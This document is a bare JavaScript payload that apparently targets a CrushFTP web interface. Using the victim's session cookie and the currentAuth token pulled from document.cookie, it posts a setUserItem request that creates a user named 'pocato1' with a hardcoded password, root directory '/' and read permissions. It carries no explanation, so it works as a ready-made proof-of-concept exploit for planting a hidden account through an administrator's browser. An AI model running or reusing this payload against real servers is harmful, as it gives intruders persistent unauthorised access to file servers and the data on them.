let xhr=new XMLHttpRequest()
xhr.withCredentials=true;
xhr.open("POST","/WebInterface/function/")
xhr.onreadystatechange=()=>{if(xhr.readyState==4){
console.log("ok")
}}
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
xhr.send(`command=setUserItem&data_action=replace&serverGroup=MainUsers&username=pocato1&user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E+%3Cuser+type%3D%22properties%22%3E%0D%0A%3Cuser_name%3Epocato1%3C%2Fuser_name%3E%0D%0A%3Cpassword%3EWs13123ss%3C%2Fpassword%3E%0D%0A%3Cextra_vfs+type%3D%22vector%22%3E%0D%0A%3C%2Fextra_vfs%3E%0D%0A%3Cversion%3E1.0%3C%2Fversion%3E%0D%0A%3Croot_dir%3E%2F%3C%2Froot_dir%3E%0D%0A%3CuserVersion%3E6%3C%2FuserVersion%3E%0D%0A%3Cmax_logins%3E0%3C%2Fmax_logins%3E%0D%0A%0D%0A%3Csite%3E(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)%0D%0A%3C%2Fsite%3E%0D%0A%3Ccreated_by_username%3Ecrushadmin%3C%2Fcreated_by_username%3E%0D%0A%3Ccreated_by_email%3E%3C%2Fcreated_by_email%3E%0D%0A%3Ccreated_time%3E1715537201302%3C%2Fcreated_time%3E%0D%0A%3Cpassword_history%3E%3C%2Fpassword_history%3E%3Clast_logins%3E05%2F12%2F2024+06%3A07%3A28+PM%3C%2Flast_logins%3E%3C%2Fuser%3E&xmlItem=user&vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cvfs+type%3D%22vector%22%3E%3C%2Fvfs%3E&permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3CVFS+type%3D%22properties%22%3E%0D%0A%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3C%2FVFS%3E&c2f=${document.cookie.match(/currentAuth=[\s\S]{4}/ig)[0].split("currentAuth=")[1]}`)
